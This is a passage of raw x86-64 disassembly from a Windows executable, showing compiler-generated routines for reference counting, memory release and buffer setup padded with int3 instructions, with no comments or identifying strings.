   140002ab4:	49 89 d0             	mov    %rdx,%r8
   140002ab7:	48 8d 15 8a ff 06 00 	lea    0x6ff8a(%rip),%rdx        # 0x140072a48
   140002abe:	5d                   	pop    %rbp
   140002abf:	e9 ac 36 01 00       	jmp    0x140016170
   140002ac4:	cc                   	int3
   140002ac5:	cc                   	int3
   140002ac6:	cc                   	int3
   140002ac7:	cc                   	int3
   140002ac8:	cc                   	int3
   140002ac9:	cc                   	int3
   140002aca:	cc                   	int3
   140002acb:	cc                   	int3
   140002acc:	cc                   	int3
   140002acd:	cc                   	int3
   140002ace:	cc                   	int3
   140002acf:	cc                   	int3
   140002ad0:	55                   	push   %rbp
   140002ad1:	48 89 e5             	mov    %rsp,%rbp
   140002ad4:	49 89 d0             	mov    %rdx,%r8
   140002ad7:	48 8d 15 2a 00 07 00 	lea    0x7002a(%rip),%rdx        # 0x140072b08
   140002ade:	5d                   	pop    %rbp
   140002adf:	e9 8c 36 01 00       	jmp    0x140016170
   140002ae4:	cc                   	int3
   140002ae5:	cc                   	int3
   140002ae6:	cc                   	int3
   140002ae7:	cc                   	int3
   140002ae8:	cc                   	int3
   140002ae9:	cc                   	int3
   140002aea:	cc                   	int3
   140002aeb:	cc                   	int3
   140002aec:	cc                   	int3
   140002aed:	cc                   	int3
   140002aee:	cc                   	int3
   140002aef:	cc                   	int3
   140002af0:	55                   	push   %rbp
   140002af1:	56                   	push   %rsi
   140002af2:	48 83 ec 28          	sub    $0x28,%rsp
   140002af6:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140002afb:	48 8b 01             	mov    (%rcx),%rax
   140002afe:	48 8b 30             	mov    (%rax),%rsi
   140002b01:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   140002b08:	48 85 f6             	test   %rsi,%rsi
   140002b0b:	74 5f                	je     0x140002b6c
   140002b0d:	0f b6 05 dd 95 07 00 	movzbl 0x795dd(%rip),%eax        # 0x14007c0f1
   140002b14:	b9 00 04 00 00       	mov    $0x400,%ecx
   140002b19:	ba 01 00 00 00       	mov    $0x1,%edx
   140002b1e:	e8 9d f2 ff ff       	call   0x140001dc0
   140002b23:	48 85 c0             	test   %rax,%rax
   140002b26:	74 50                	je     0x140002b78
   140002b28:	48 c7 06 00 00 00 00 	movq   $0x0,(%rsi)
   140002b2f:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%rsi)
   140002b36:	c6 46 0c 00          	movb   $0x0,0xc(%rsi)
   140002b3a:	48 c7 46 10 00 00 00 	movq   $0x0,0x10(%rsi)
   140002b41:	00 
   140002b42:	48 c7 46 18 00 04 00 	movq   $0x400,0x18(%rsi)
   140002b49:	00 
   140002b4a:	48 89 46 20          	mov    %rax,0x20(%rsi)
   140002b4e:	48 c7 46 28 00 00 00 	movq   $0x0,0x28(%rsi)
   140002b55:	00 
   140002b56:	c6 46 30 00          	movb   $0x0,0x30(%rsi)
   140002b5a:	c6 46 35 00          	movb   $0x0,0x35(%rsi)
   140002b5e:	c7 46 31 00 00 00 00 	movl   $0x0,0x31(%rsi)
   140002b65:	48 83 c4 28          	add    $0x28,%rsp
   140002b69:	5e                   	pop    %rsi
   140002b6a:	5d                   	pop    %rbp
   140002b6b:	c3                   	ret
   140002b6c:	48 8d 0d 95 0b 07 00 	lea    0x70b95(%rip),%rcx        # 0x140073708
   140002b73:	e8 78 8b 01 00       	call   0x14001b6f0
   140002b78:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002b7d:	ba 00 04 00 00       	mov    $0x400,%edx
   140002b82:	e8 be 8a 01 00       	call   0x14001b645
   140002b87:	cc                   	int3
   140002b88:	cc                   	int3
   140002b89:	cc                   	int3
   140002b8a:	cc                   	int3
   140002b8b:	cc                   	int3
   140002b8c:	cc                   	int3
   140002b8d:	cc                   	int3
   140002b8e:	cc                   	int3
   140002b8f:	cc                   	int3
   140002b90:	55                   	push   %rbp
   140002b91:	48 83 ec 40          	sub    $0x40,%rsp
   140002b95:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140002b9a:	48 8b 11             	mov    (%rcx),%rdx
   140002b9d:	48 8b 0a             	mov    (%rdx),%rcx
   140002ba0:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140002ba4:	48 c7 02 00 00 00 00 	movq   $0x0,(%rdx)
   140002bab:	48 85 c9             	test   %rcx,%rcx
   140002bae:	74 4f                	je     0x140002bff
   140002bb0:	c6 01 01             	movb   $0x1,(%rcx)
   140002bb3:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002bb6:	0f 11 45 f0          	movups %xmm0,-0x10(%rbp)
   140002bba:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   140002bc1:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%rax)
   140002bc8:	c6 40 0c 00          	movb   $0x0,0xc(%rax)
   140002bcc:	0f 10 45 ed          	movups -0x13(%rbp),%xmm0
   140002bd0:	0f 11 40 0d          	movups %xmm0,0xd(%rax)
   140002bd4:	8b 4d fc             	mov    -0x4(%rbp),%ecx
   140002bd7:	89 48 1c             	mov    %ecx,0x1c(%rax)
   140002bda:	48 c7 40 20 01 00 00 	movq   $0x1,0x20(%rax)
   140002be1:	00 
   140002be2:	48 c7 40 28 00 00 00 	movq   $0x0,0x28(%rax)
   140002be9:	00 
   140002bea:	c6 40 30 00          	movb   $0x0,0x30(%rax)
   140002bee:	c6 40 35 00          	movb   $0x0,0x35(%rax)
   140002bf2:	c7 40 31 00 00 00 00 	movl   $0x0,0x31(%rax)
   140002bf9:	48 83 c4 40          	add    $0x40,%rsp
   140002bfd:	5d                   	pop    %rbp
   140002bfe:	c3                   	ret
   140002bff:	48 8d 0d 02 0b 07 00 	lea    0x70b02(%rip),%rcx        # 0x140073708
   140002c06:	e8 e5 8a 01 00       	call   0x14001b6f0
   140002c0b:	cc                   	int3
   140002c0c:	cc                   	int3
   140002c0d:	cc                   	int3
   140002c0e:	cc                   	int3
   140002c0f:	cc                   	int3
   140002c10:	55                   	push   %rbp
   140002c11:	48 83 ec 30          	sub    $0x30,%rsp
   140002c15:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140002c1a:	48 8b 01             	mov    (%rcx),%rax
   140002c1d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140002c21:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   140002c25:	e8 e6 59 00 00       	call   0x140008610
   140002c2a:	90                   	nop
   140002c2b:	48 83 c4 30          	add    $0x30,%rsp
   140002c2f:	5d                   	pop    %rbp
   140002c30:	c3                   	ret
   140002c31:	cc                   	int3
   140002c32:	cc                   	int3
   140002c33:	cc                   	int3
   140002c34:	cc                   	int3
   140002c35:	cc                   	int3
   140002c36:	cc                   	int3
   140002c37:	cc                   	int3
   140002c38:	cc                   	int3
   140002c39:	cc                   	int3
   140002c3a:	cc                   	int3
   140002c3b:	cc                   	int3
   140002c3c:	cc                   	int3
   140002c3d:	cc                   	int3
   140002c3e:	cc                   	int3
   140002c3f:	cc                   	int3
   140002c40:	55                   	push   %rbp
   140002c41:	48 89 e5             	mov    %rsp,%rbp
   140002c44:	5d                   	pop    %rbp
   140002c45:	e9 c6 66 00 00       	jmp    0x140009310
   140002c4a:	cc                   	int3
   140002c4b:	cc                   	int3
   140002c4c:	cc                   	int3
   140002c4d:	cc                   	int3
   140002c4e:	cc                   	int3
   140002c4f:	cc                   	int3
   140002c50:	55                   	push   %rbp
   140002c51:	56                   	push   %rsi
   140002c52:	53                   	push   %rbx
   140002c53:	48 83 ec 50          	sub    $0x50,%rsp
   140002c57:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140002c5c:	48 c7 45 f8 fe ff ff 	movq   $0xfffffffffffffffe,-0x8(%rbp)
   140002c63:	ff 
   140002c64:	48 89 d0             	mov    %rdx,%rax
   140002c67:	48 89 55 d0          	mov    %rdx,-0x30(%rbp)
   140002c6b:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140002c6f:	41 0f 10 00          	movups (%r8),%xmm0
   140002c73:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140002c77:	4d 8b 40 10          	mov    0x10(%r8),%r8
   140002c7b:	4c 89 45 e8          	mov    %r8,-0x18(%rbp)
   140002c7f:	44 0f b6 41 20       	movzbl 0x20(%rcx),%r8d
   140002c84:	48 8b 31             	mov    (%rcx),%rsi
   140002c87:	45 31 c9             	xor    %r9d,%r9d
   140002c8a:	49 89 f2             	mov    %rsi,%r10
   140002c8d:	49 f7 da             	neg    %r10
   140002c90:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
   140002c94:	4c 0f 41 c9          	cmovno %rcx,%r9
   140002c98:	48 89 c1             	mov    %rax,%rcx
   140002c9b:	e8 a0 69 00 00       	call   0x140009640
   140002ca0:	48 8d 0c 75 00 00 00 	lea    0x0(,%rsi,2),%rcx
   140002ca7:	00 
   140002ca8:	48 85 c9             	test   %rcx,%rcx
   140002cab:	74 1a                	je     0x140002cc7
   140002cad:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002cb1:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140002cb5:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002cbb:	48 89 f2             	mov    %rsi,%rdx
   140002cbe:	89 c3                	mov    %eax,%ebx
   140002cc0:	e8 0b f1 ff ff       	call   0x140001dd0
   140002cc5:	89 d8                	mov    %ebx,%eax
   140002cc7:	48 83 c4 50          	add    $0x50,%rsp
   140002ccb:	5b                   	pop    %rbx
   140002ccc:	5e                   	pop    %rsi
   140002ccd:	5d                   	pop    %rbp
   140002cce:	c3                   	ret
   140002ccf:	90                   	nop
   140002cd0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002cd5:	55                   	push   %rbp
   140002cd6:	56                   	push   %rsi
   140002cd7:	53                   	push   %rbx
   140002cd8:	48 83 ec 20          	sub    $0x20,%rsp
   140002cdc:	48 8d 6a 50          	lea    0x50(%rdx),%rbp
   140002ce0:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002ce4:	e8 b7 02 00 00       	call   0x140002fa0
   140002ce9:	90                   	nop
   140002cea:	48 83 c4 20          	add    $0x20,%rsp
   140002cee:	5b                   	pop    %rbx
   140002cef:	5e                   	pop    %rsi
   140002cf0:	5d                   	pop    %rbp
   140002cf1:	c3                   	ret
   140002cf2:	cc                   	int3
   140002cf3:	cc                   	int3
   140002cf4:	cc                   	int3
   140002cf5:	cc                   	int3
   140002cf6:	cc                   	int3
   140002cf7:	cc                   	int3
   140002cf8:	cc                   	int3
   140002cf9:	cc                   	int3
   140002cfa:	cc                   	int3
   140002cfb:	cc                   	int3
   140002cfc:	cc                   	int3
   140002cfd:	cc                   	int3
   140002cfe:	cc                   	int3
   140002cff:	cc                   	int3
   140002d00:	55                   	push   %rbp
   140002d01:	48 89 e5             	mov    %rsp,%rbp
   140002d04:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   140002d09:	74 0a                	je     0x140002d15
   140002d0b:	48 83 c1 08          	add    $0x8,%rcx
   140002d0f:	5d                   	pop    %rbp
   140002d10:	e9 3b 01 00 00       	jmp    0x140002e50
   140002d15:	90                   	nop
   140002d16:	5d                   	pop    %rbp
   140002d17:	c3                   	ret
   140002d18:	cc                   	int3
   140002d19:	cc                   	int3
   140002d1a:	cc                   	int3
   140002d1b:	cc                   	int3
   140002d1c:	cc                   	int3
   140002d1d:	cc                   	int3
   140002d1e:	cc                   	int3
   140002d1f:	cc                   	int3
   140002d20:	55                   	push   %rbp
   140002d21:	48 89 e5             	mov    %rsp,%rbp
   140002d24:	48 8b 01             	mov    (%rcx),%rax
   140002d27:	f0 48 ff 08          	lock decq (%rax)
   140002d2b:	75 06                	jne    0x140002d33
   140002d2d:	5d                   	pop    %rbp
   140002d2e:	e9 ad 0d 00 00       	jmp    0x140003ae0
   140002d33:	90                   	nop
   140002d34:	5d                   	pop    %rbp
   140002d35:	c3                   	ret
   140002d36:	cc                   	int3
   140002d37:	cc                   	int3
   140002d38:	cc                   	int3
   140002d39:	cc                   	int3
   140002d3a:	cc                   	int3
   140002d3b:	cc                   	int3
   140002d3c:	cc                   	int3
   140002d3d:	cc                   	int3
   140002d3e:	cc                   	int3
   140002d3f:	cc                   	int3
   140002d40:	55                   	push   %rbp
   140002d41:	48 83 ec 40          	sub    $0x40,%rsp
   140002d45:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140002d4a:	48 c7 45 f8 fe ff ff 	movq   $0xfffffffffffffffe,-0x8(%rbp)
   140002d51:	ff 
   140002d52:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140002d56:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140002d5a:	48 8b 02             	mov    (%rdx),%rax
   140002d5d:	48 85 c0             	test   %rax,%rax
   140002d60:	74 06                	je     0x140002d68
   140002d62:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140002d66:	ff d0                	call   *%rax
   140002d68:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140002d6c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002d70:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140002d74:	48 85 d2             	test   %rdx,%rdx
   140002d77:	74 0e                	je     0x140002d87
   140002d79:	4c 8b 40 10          	mov    0x10(%rax),%r8
   140002d7d:	48 83 c4 40          	add    $0x40,%rsp
   140002d81:	5d                   	pop    %rbp
   140002d82:	e9 49 f0 ff ff       	jmp    0x140001dd0
   140002d87:	90                   	nop
   140002d88:	48 83 c4 40          	add    $0x40,%rsp
   140002d8c:	5d                   	pop    %rbp
   140002d8d:	c3                   	ret
   140002d8e:	66 90                	xchg   %ax,%ax
   140002d90:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002d95:	55                   	push   %rbp
   140002d96:	48 83 ec 20          	sub    $0x20,%rsp
   140002d9a:	48 8d 6a 40          	lea    0x40(%rdx),%rbp
   140002d9e:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140002da2:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002da6:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140002daa:	48 85 d2             	test   %rdx,%rdx
   140002dad:	74 0d                	je     0x140002dbc
   140002daf:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002db3:	4c 8b 40 10          	mov    0x10(%rax),%r8
   140002db7:	e8 14 f0 ff ff       	call   0x140001dd0
   140002dbc:	90                   	nop
   140002dbd:	48 83 c4 20          	add    $0x20,%rsp
   140002dc1:	5d                   	pop    %rbp
   140002dc2:	c3                   	ret
   140002dc3:	cc                   	int3
   140002dc4:	cc                   	int3
   140002dc5:	cc                   	int3
   140002dc6:	cc                   	int3
   140002dc7:	cc                   	int3
   140002dc8:	cc                   	int3
   140002dc9:	cc                   	int3
   140002dca:	cc                   	int3
   140002dcb:	cc                   	int3
   140002dcc:	cc                   	int3
   140002dcd:	cc                   	int3
   140002dce:	cc                   	int3
   140002dcf:	cc                   	int3
   140002dd0:	55                   	push   %rbp
   140002dd1:	48 89 e5             	mov    %rsp,%rbp
   140002dd4:	ff 49 08             	decl   0x8(%rcx)
   140002dd7:	75 1c                	jne    0x140002df5
   140002dd9:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
   140002de0:	31 c0                	xor    %eax,%eax
   140002de2:	86 41 0c             	xchg   %al,0xc(%rcx)
   140002de5:	3c 02                	cmp    $0x2,%al
   140002de7:	75 0c                	jne    0x140002df5
   140002de9:	48 83 c1 0c          	add    $0xc,%rcx
   140002ded:	5d                   	pop    %rbp
   140002dee:	48 ff 25 d3 93 01 00 	rex.W jmp *0x193d3(%rip)        # 0x14001c1c8
   140002df5:	90                   	nop
   140002df6:	5d                   	pop    %rbp
   140002df7:	c3                   	ret
   140002df8:	cc                   	int3
   140002df9:	cc                   	int3
   140002dfa:	cc                   	int3
   140002dfb:	cc                   	int3
   140002dfc:	cc                   	int3
   140002dfd:	cc                   	int3
   140002dfe:	cc                   	int3
   140002dff:	cc                   	int3
   140002e00:	55                   	push   %rbp
   140002e01:	48 89 e5             	mov    %rsp,%rbp
   140002e04:	83 39 01             	cmpl   $0x1,(%rcx)
   140002e07:	75 19                	jne    0x140002e22
   140002e09:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140002e0d:	48 85 c0             	test   %rax,%rax
   140002e10:	74 10                	je     0x140002e22
   140002e12:	f0 48 ff 08          	lock decq (%rax)
   140002e16:	75 0a                	jne    0x140002e22
   140002e18:	48 83 c1 08          	add    $0x8,%rcx
   140002e1c:	5d                   	pop    %rbp
   140002e1d:	e9 be 0c 00 00       	jmp    0x140003ae0
   140002e22:	90                   	nop
   140002e23:	5d                   	pop    %rbp
   140002e24:	c3                   	ret
   140002e25:	cc                   	int3
   140002e26:	cc                   	int3
   140002e27:	cc                   	int3
   140002e28:	cc                   	int3
   140002e29:	cc                   	int3
   140002e2a:	cc                   	int3
   140002e2b:	cc                   	int3
   140002e2c:	cc                   	int3
   140002e2d:	cc                   	int3
   140002e2e:	cc                   	int3
   140002e2f:	cc                   	int3
   140002e30:	55                   	push   %rbp
   140002e31:	48 89 e5             	mov    %rsp,%rbp
   140002e34:	48 8b 11             	mov    (%rcx),%rdx
   140002e37:	48 85 d2             	test   %rdx,%rdx
   140002e3a:	74 10                	je     0x140002e4c
   140002e3c:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140002e40:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002e46:	5d                   	pop    %rbp
   140002e47:	e9 84 ef ff ff       	jmp    0x140001dd0
   140002e4c:	90                   	nop
   140002e4d:	5d                   	pop    %rbp
   140002e4e:	c3                   	ret
   140002e4f:	cc                   	int3
   140002e50:	55                   	push   %rbp
   140002e51:	48 83 ec 40          	sub    $0x40,%rsp
   140002e55:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140002e5a:	48 c7 45 f8 fe ff ff 	movq   $0xfffffffffffffffe,-0x8(%rbp)
   140002e61:	ff 
   140002e62:	48 8b 01             	mov    (%rcx),%rax
   140002e65:	89 c1                	mov    %eax,%ecx
   140002e67:	83 e1 03             	and    $0x3,%ecx
   140002e6a:	83 f9 01             	cmp    $0x1,%ecx
   140002e6d:	75 59                	jne    0x140002ec8
   140002e6f:	48 8d 48 ff          	lea    -0x1(%rax),%rcx
   140002e73:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
   140002e77:	48 8b 48 ff          	mov    -0x1(%rax),%rcx
   140002e7b:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140002e7f:	48 8b 40 07          	mov    0x7(%rax),%rax
   140002e83:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140002e87:	48 8b 00             	mov    (%rax),%rax
   140002e8a:	48 85 c0             	test   %rax,%rax
   140002e8d:	74 06                	je     0x140002e95
   140002e8f:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140002e93:	ff d0                	call   *%rax
   140002e95:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140002e99:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002e9d:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140002ea1:	48 85 d2             	test   %rdx,%rdx
   140002ea4:	74 09                	je     0x140002eaf
   140002ea6:	4c 8b 40 10          	mov    0x10(%rax),%r8
   140002eaa:	e8 21 ef ff ff       	call   0x140001dd0
   140002eaf:	ba 18 00 00 00       	mov    $0x18,%edx
   140002eb4:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140002eba:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140002ebe:	48 83 c4 40          	add    $0x40,%rsp
   140002ec2:	5d                   	pop    %rbp
   140002ec3:	e9 08 ef ff ff       	jmp    0x140001dd0
   140002ec8:	90                   	nop
   140002ec9:	48 83 c4 40          	add    $0x40,%rsp
   140002ecd:	5d                   	pop    %rbp
   140002ece:	c3                   	ret
   140002ecf:	90                   	nop
   140002ed0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002ed5:	55                   	push   %rbp
   140002ed6:	48 83 ec 20          	sub    $0x20,%rsp
   140002eda:	48 8d 6a 40          	lea    0x40(%rdx),%rbp
   140002ede:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140002ee2:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002ee6:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140002eea:	48 85 d2             	test   %rdx,%rdx
   140002eed:	74 0d                	je     0x140002efc
   140002eef:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002ef3:	4c 8b 40 10          	mov    0x10(%rax),%r8
   140002ef7:	e8 d4 ee ff ff       	call   0x140001dd0
   140002efc:	ba 18 00 00 00       	mov    $0x18,%edx
   140002f01:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140002f07:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140002f0b:	e8 c0 ee ff ff       	call   0x140001dd0
   140002f10:	90                   	nop
   140002f11:	48 83 c4 20          	add    $0x20,%rsp
   140002f15:	5d                   	pop    %rbp
   140002f16:	c3                   	ret
   140002f17:	cc                   	int3
   140002f18:	cc                   	int3
   140002f19:	cc                   	int3
   140002f1a:	cc                   	int3
   140002f1b:	cc                   	int3
   140002f1c:	cc                   	int3
   140002f1d:	cc                   	int3
   140002f1e:	cc                   	int3
   140002f1f:	cc                   	int3
   140002f20:	55                   	push   %rbp
   140002f21:	56                   	push   %rsi
   140002f22:	48 83 ec 28          	sub    $0x28,%rsp
   140002f26:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140002f2b:	f6 c2 01             	test   $0x1,%dl
   140002f2e:	75 0f                	jne    0x140002f3f
   140002f30:	48 8b 05 59 92 07 00 	mov    0x79259(%rip),%rax        # 0x14007c190
   140002f37:	48 d1 e0             	shl    $1,%rax
   140002f3a:	48 85 c0             	test   %rax,%rax
   140002f3d:	75 1d                	jne    0x140002f5c
   140002f3f:	31 c0                	xor    %eax,%eax
   140002f41:	86 01                	xchg   %al,(%rcx)
   140002f43:	3c 02                	cmp    $0x2,%al
   140002f45:	75 0d                	jne    0x140002f54
   140002f47:	48 83 c4 28          	add    $0x28,%rsp
   140002f4b:	5e                   	pop    %rsi
   140002f4c:	5d                   	pop    %rbp
   140002f4d:	48 ff 25 74 92 01 00 	rex.W jmp *0x19274(%rip)        # 0x14001c1c8
   140002f54:	90                   	nop
   140002f55:	48 83 c4 28          	add    $0x28,%rsp
   140002f59:	5e                   	pop    %rsi
   140002f5a:	5d                   	pop    %rbp
   140002f5b:	c3                   	ret
   140002f5c:	48 89 ce             	mov    %rcx,%rsi
   140002f5f:	e8 ac 7f 01 00       	call   0x14001af10
   140002f64:	48 89 f1             	mov    %rsi,%rcx
   140002f67:	84 c0                	test   %al,%al
   140002f69:	75 d4                	jne    0x140002f3f
   140002f6b:	c6 41 01 01          	movb   $0x1,0x1(%rcx)
   140002f6f:	eb ce                	jmp    0x140002f3f
   140002f71:	cc                   	int3
   140002f72:	cc                   	int3
   140002f73:	cc                   	int3
   140002f74:	cc                   	int3
   140002f75:	cc                   	int3
   140002f76:	cc                   	int3
   140002f77:	cc                   	int3
   140002f78:	cc                   	int3
   140002f79:	cc                   	int3
   140002f7a:	cc                   	int3
   140002f7b:	cc                   	int3
   140002f7c:	cc                   	int3
   140002f7d:	cc                   	int3
   140002f7e:	cc                   	int3
   140002f7f:	cc                   	int3
   140002f80:	55                   	push   %rbp
   140002f81:	48 89 e5             	mov    %rsp,%rbp
   140002f84:	48 8b 01             	mov    (%rcx),%rax
   140002f87:	48 85 c0             	test   %rax,%rax
   140002f8a:	74 0c                	je     0x140002f98
   140002f8c:	f0 48 ff 08          	lock decq (%rax)
   140002f90:	75 06                	jne    0x140002f98
   140002f92:	5d                   	pop    %rbp
   140002f93:	e9 e8 0a 00 00       	jmp    0x140003a80
   140002f98:	90                   	nop
   140002f99:	5d                   	pop    %rbp
   140002f9a:	c3                   	ret
   140002f9b:	cc                   	int3
   140002f9c:	cc                   	int3
   140002f9d:	cc                   	int3
   140002f9e:	cc                   	int3
   140002f9f:	cc                   	int3
   140002fa0:	55                   	push   %rbp
   140002fa1:	48 89 e5             	mov    %rsp,%rbp
   140002fa4:	48 8b 11             	mov    (%rcx),%rdx
   140002fa7:	48 8d 04 55 00 00 00 	lea    0x0(,%rdx,2),%rax
   140002fae:	00 
   140002faf:	48 85 c0             	test   %rax,%rax
   140002fb2:	75 02                	jne    0x140002fb6
   140002fb4:	5d                   	pop    %rbp
   140002fb5:	c3                   	ret
   140002fb6:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140002fba:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002fc0:	5d                   	pop    %rbp
   140002fc1:	e9 0a ee ff ff       	jmp    0x140001dd0
   140002fc6:	cc                   	int3
   140002fc7:	cc                   	int3
   140002fc8:	cc                   	int3
   140002fc9:	cc                   	int3
   140002fca:	cc                   	int3
   140002fcb:	cc                   	int3
   140002fcc:	cc                   	int3
   140002fcd:	cc                   	int3
   140002fce:	cc                   	int3
   140002fcf:	cc                   	int3
   140002fd0:	55                   	push   %rbp
   140002fd1:	48 89 e5             	mov    %rsp,%rbp
   140002fd4:	48 83 39 00          	cmpq   $0x0,(%rcx)
   140002fd8:	74 06                	je     0x140002fe0
   140002fda:	5d                   	pop    %rbp
   140002fdb:	e9 70 fe ff ff       	jmp    0x140002e50
   140002fe0:	90                   	nop
   140002fe1:	5d                   	pop    %rbp
   140002fe2:	c3                   	ret
   140002fe3:	cc                   	int3
   140002fe4:	cc                   	int3
   140002fe5:	cc                   	int3
   140002fe6:	cc                   	int3
   140002fe7:	cc                   	int3
   140002fe8:	cc                   	int3
   140002fe9:	cc                   	int3
   140002fea:	cc                   	int3
   140002feb:	cc                   	int3
   140002fec:	cc                   	int3
   140002fed:	cc                   	int3
   140002fee:	cc                   	int3
   140002fef:	cc                   	int3
   140002ff0:	55                   	push   %rbp
   140002ff1:	48 89 e5             	mov    %rsp,%rbp
   140002ff4:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140002ff9:	f0 0f c1 11          	lock xadd %edx,(%rcx)
   140002ffd:	ff ca                	dec    %edx
   140002fff:	89 d0                	mov    %edx,%eax
   140003001:	25 ff ff ff bf       	and    $0xbfffffff,%eax
   140003006:	f7 d8                	neg    %eax
   140003008:	70 02                	jo     0x14000300c
   14000300a:	5d                   	pop    %rbp
   14000300b:	c3                   	ret
   14000300c:	5d                   	pop    %rbp
   14000300d:	e9 de 83 01 00       	jmp    0x14001b3f0
   140003012:	cc                   	int3
   140003013:	cc                   	int3
   140003014:	cc                   	int3
   140003015:	cc                   	int3
   140003016:	cc                   	int3
   140003017:	cc                   	int3
   140003018:	cc                   	int3
   140003019:	cc                   	int3
   14000301a:	cc                   	int3
   14000301b:	cc                   	int3
   14000301c:	cc                   	int3
   14000301d:	cc                   	int3
   14000301e:	cc                   	int3
   14000301f:	cc                   	int3
   140003020:	55                   	push   %rbp
   140003021:	56                   	push   %rsi
   140003022:	57                   	push   %rdi
   140003023:	48 83 ec 20          	sub    $0x20,%rsp
   140003027:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000302c:	48 85 d2             	test   %rdx,%rdx
   14000302f:	74 2f                	je     0x140003060
   140003031:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140003035:	48 89 c6             	mov    %rax,%rsi
   140003038:	48 29 d6             	sub    %rdx,%rsi
   14000303b:	72 2b                	jb     0x140003068
   14000303d:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140003044:	00 
   140003045:	74 19                	je     0x140003060
   140003047:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000304b:	48 01 c2             	add    %rax,%rdx
   14000304e:	48 89 cf             	mov    %rcx,%rdi
   140003051:	48 89 c1             	mov    %rax,%rcx
   140003054:	49 89 f0             	mov    %rsi,%r8
   140003057:	e8 3b 78 01 00       	call   0x14001a897
   14000305c:	48 89 77 10          	mov    %rsi,0x10(%rdi)
   140003060:	48 83 c4 20          	add    $0x20,%rsp
   140003064:	5f                   	pop    %rdi
   140003065:	5e                   	pop    %rsi
   140003066:	5d                   	pop    %rbp
   140003067:	c3                   	ret
   140003068:	4c 8d 05 61 f8 06 00 	lea    0x6f861(%rip),%r8        # 0x1400728d0
   14000306f:	48 89 d1             	mov    %rdx,%rcx
   140003072:	48 89 c2             	mov    %rax,%rdx
   140003075:	e8 e6 8a 01 00       	call   0x14001bb60
   14000307a:	cc                   	int3
   14000307b:	cc                   	int3
   14000307c:	cc                   	int3
   14000307d:	cc                   	int3
   14000307e:	cc                   	int3
   14000307f:	cc                   	int3
   140003080:	55                   	push   %rbp
   140003081:	48 83 ec 50          	sub    $0x50,%rsp
   140003085:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000308a:	48 c7 45 f8 fe ff ff 	movq   $0xfffffffffffffffe,-0x8(%rbp)
   140003091:	ff 
   140003092:	80 79 18 00          	cmpb   $0x0,0x18(%rcx)
   140003096:	75 71                	jne    0x140003109
   140003098:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
   14000309c:	e8 cf 1f 00 00       	call   0x140005070
   1400030a1:	89 c1                	mov    %eax,%ecx
   1400030a3:	83 e1 03             	and    $0x3,%ecx
   1400030a6:	83 f9 01             	cmp    $0x1,%ecx
   1400030a9:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   1400030ad:	75 5a                	jne    0x140003109
   1400030af:	48 89 c1             	mov    %rax,%rcx
   1400030b2:	48 ff c9             	dec    %rcx
   1400030b5:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
